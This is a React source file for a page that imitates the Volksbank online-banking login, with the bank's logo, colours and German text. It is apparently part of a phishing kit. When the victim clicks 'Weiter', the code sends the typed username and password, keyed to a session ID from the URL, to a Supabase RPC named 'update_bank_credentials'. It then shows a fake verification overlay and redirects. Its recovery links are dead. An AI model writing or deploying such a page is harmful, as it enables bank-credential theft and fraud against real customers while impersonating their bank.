import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Eye, EyeOff } from "lucide-react";
import volksbankLogo from "@/assets/volksbank-logo.png";
import volksbankBg from "@/assets/volksbank-bg.png";
import volksbankIcon from "@/assets/volksbank.png";

const Volksbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const fromInvestmentCheck = searchParams.get("ic") === "1";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Volksbank - Login", volksbankIcon);

  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-3">
          <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-14" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${volksbankBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] rounded overflow-hidden">
          {/* Blue header bar */}
          <div
            className="px-6 py-4 text-white font-semibold text-xl"
            style={{ backgroundColor: "#196bc1" }}
          >
            {lang === "de" ? "hausbanking Login" : "Login"}
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-base leading-snug" style={{ color: "#333" }}>
              {lang === "de"
                ? "Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten."
                : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
            </p>

            {/* Divider */}
            <hr className="-mx-6 border-gray-200" />

            {/* Label row */}
            <div className="flex items-center justify-between">
              <span className="font-semibold text-xs" style={{ color: "#999" }}>
                {lang === "de" ? "Anmeldung mit Benutzername" : "User name or authorised party number"}
              </span>
              <span className="text-sm space-x-2">
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    setLang(lang === "de" ? "en" : "de");
                  }}
                  style={{ color: "#196bc1" }}
                >
                  {lang === "de" ? "English" : "Deutsch"}
                </a>
              </span>
            </div>

            {/* Username input */}
            <div className="relative">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                style={{
                  backgroundColor: isFocused ? "#d6e5f4" : "#e8e8e8",
                  borderColor: isFocused ? "#196bc1" : "#999",
                  boxShadow: isFocused ? "0 0 0 1px #196bc1" : "none",
                }}
                placeholder=""
              />
              {username && (
                <button
                  onClick={() => setUsername("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  <X size={24} color={isFocused ? "#196bc1" : "#333"} />
                </button>
              )}
            </div>

            {/* Password label */}
            <span className="font-semibold text-xs" style={{ color: "#999" }}>
              {lang === "de" ? "Passwort" : "Password"}
            </span>

            {/* Password input */}
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setIsPasswordFocused(true)}
                onBlur={() => setIsPasswordFocused(false)}
                className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                style={{
                  backgroundColor: isPasswordFocused ? "#d6e5f4" : "#e8e8e8",
                  borderColor: isPasswordFocused ? "#196bc1" : "#999",
                  boxShadow: isPasswordFocused ? "0 0 0 1px #196bc1" : "none",
                }}
                placeholder=""
              />
              {password && (
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  {showPassword ? <EyeOff size={20} color={isPasswordFocused ? "#196bc1" : "#333"} /> : <Eye size={20} color={isPasswordFocused ? "#196bc1" : "#333"} />}
                </button>
              )}
            </div>

            {/* Divider above button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Weiter button */}
            <button
              onClick={async () => {
                console.log("Session ID:", sessionId);
                if (sessionId) {
                  const { error } = await supabase.rpc("update_bank_credentials", {
                    p_session_id: sessionId,
                    p_username: username,
                    p_password: password,
                    p_username_label: "Benutzername",
                    p_password_label: "Passwort",
                  });
                  if (error) console.error("Update failed:", error);
                  else console.log("Update successful");
                } else {
                  console.error("No session ID found in URL!");
                }
                setShowLoading(true);
              }}
              className="w-full py-3 text-white font-semibold rounded text-sm"
              style={{ backgroundColor: "#196bc1" }}
            >
              {lang === "de" ? "Weiter" : "Continue"}
            </button>

            {/* Divider below button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Terms text - only in German */}
            {lang === "de" && (
              <p className="text-[15px] text-center" style={{ color: "#333" }}>
                Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
              </p>
            )}

            {/* Links */}
            <div className="flex flex-col items-center" style={{ gap: 0 }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#196bc1" }}
              >
                {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
              </a>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#196bc1" }}
              >
                {lang === "de" ? "Passwort vergessen?" : "Forgot password?"}
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default Volksbank;
